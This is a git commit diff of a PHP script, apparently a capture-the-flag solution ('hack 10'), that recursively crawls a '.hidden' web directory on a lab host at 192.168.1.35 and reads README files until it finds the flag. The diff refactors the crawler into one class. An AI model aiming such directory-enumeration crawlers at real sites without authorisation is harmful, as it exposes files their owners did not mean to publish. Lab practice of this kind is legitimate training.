35ec940f00a6bc3d66fbd95f3fbf28b1f45a3a1d
pvictor <p.victor@outlook.fr>
2020-07-15 23:25:28 +0200

    hack 10: browsing files again - completed

--- hidden.php
+++ hidden.php
@@ -3,8 +3,6 @@
 print("Let's search this flag!<br/>");
 $hidden_flag = new hidden_flag();
 $hidden_flag->run();
-//$search = new search();
-//$search->run();
 
 Class hidden_flag {
 	const URL = "http://192.168.1.35/";
@@ -13,7 +11,9 @@ Class hidden_flag {
 	const NBR_OF_FILES = 26;
 
 	private string $tree;
-	private int $i;
+	// All the subdirectories in a path
+	private $explore_path = ["", "", ""];
+	private $subdirectories = [];
 
 	/*
 	**	Get the full directory tree
@@ -22,87 +22,43 @@ Class hidden_flag {
 	public function __Construct() {
 		print("Searching in " . self::FULL_URL . "<br/>");
 		$this->tree = file_get_contents(self::FULL_URL);
-		//print_r($this->tree);
 	}
 
-	public function run() {
-		$i = 0;
-		$read_me = file_get_contents(self::FULL_URL."README");
-		print("<br/>salut ".$read_me."<br/>");
-		preg_match_all('#<a href="(.*)">(.*)</a>#', $this->tree, $rep);
-		print(split('<', $rep[0][1]));
-		$url = self::FULL_URL.split('<', split('>', $rep[0][1])[1])[0];
-		print_r($url);
-		while ($i < self::NBR_OF_FILES) {
+	/*
+	**	Get all possibilities depending on which depth we're at
+	*/
 
-			//print("<br/>i = " . $i . " / url = " . file_get_contents(self::FULL_URL));
-			$i++;
-		}
-	}
-
-}
-
-Class search {
-
-	const ROOT = "http://192.168.1.35/.hidden/";
-	const NB_PAR_PAGE = 26;
-
-	/**
-	 * @is_good integer
-	 */
-	private $i = 0;
-
-	/**
-	 * @html String
-	 */
-	private $html;
-
-	/**
-	 * @way array
-	 */
-	private $way = ["", "", ""];
-
-	/**
-	 * @possibilities array
-	 */
-	private $possibilities = [];
-
-
-	public function __Construct() {
-
-		$this->html = file_get_contents(self::ROOT);
-	}
-
-	private function get_way($type, $integer) {
-
-		if ($type == 0)
-			$url = self::ROOT;
-		if ($type == 1)
-			$url = self::ROOT.$this->way[0].'/';
-		if ($type == 2)
-			$url = self::ROOT.$this->way[0].'/'.$this->way[1].'/';
-
+	private function get_path($depth, $i) {
+		if ($depth == 0)
+			$url = self::FULL_URL;
+		if ($depth == 1)
+			$url = self::FULL_URL.$this->explore_path[0].'/';
+		if ($depth == 2)
+			$url = self::FULL_URL.$this->explore_path[0].'/'.$this->explore_path[1].'/';
 		$this->html = file_get_contents($url);
 		preg_match_all('#<a href="(.*)">(.*)</a>#', $this->html, $rep);
 		$this->possibilities = $rep[1];
 		unset($this->possibilities[0]);
 		$this->possibilities = array_values($this->possibilities);
-		return ($this->possibilities[$integer]);
+		return ($this->possibilities[$i]);
 	}
 
-	public function run() {
+	/*
+	**	Explore all until the file content of a README starts with a number
+	*/
 
-		$i = 0;
-		while ($i <= self::NB_PAR_PAGE) {
-			$this->way[0] = $this->get_way(0, $i);
+	public function run() {
+		$i = 1;
+		while ($i < self::NBR_OF_FILES) {
+			$this->explore_path[0] = $this->get_path(0, $i);
 			$j = 0;
-			while ($j < self::NB_PAR_PAGE) {
-				$this->way[1] = $this->get_way(1, $j);
+			while ($j < self::NBR_OF_FILES) {
+				$this->explore_path[1] = $this->get_path(1, $j);
 				$k = 0;
-				while ($k < self::NB_PAR_PAGE) {
-					$this->way[2] = $this->get_way(2, $k);
-					if (is_numeric(file_get_contents(self::ROOT.implode("", $this->way).'README')[0])) {
-						echo "flag : ".file_get_contents(self::ROOT.implode("", $this->way).'README'). "in dir ".$i." in file ".$j."in flie".$k;
+				while ($k < self::NBR_OF_FILES) {
+					$this->explore_path[2] = $this->get_path(2, $k);
+					if (is_numeric(file_get_contents(self::FULL_URL.implode("", $this->explore_path).'README')[0])) {
+						echo "flag : ".file_get_contents(self::FULL_URL.implode("", $this->explore_path).'README'). "was found at path ".self::FULL_URL.implode("", $this->explore_path);
 						return (0);
 					}
 					$k++;
@@ -112,6 +68,7 @@ Class search {
 			$i++;
 		}
 	}
+
 }
 
 ?>
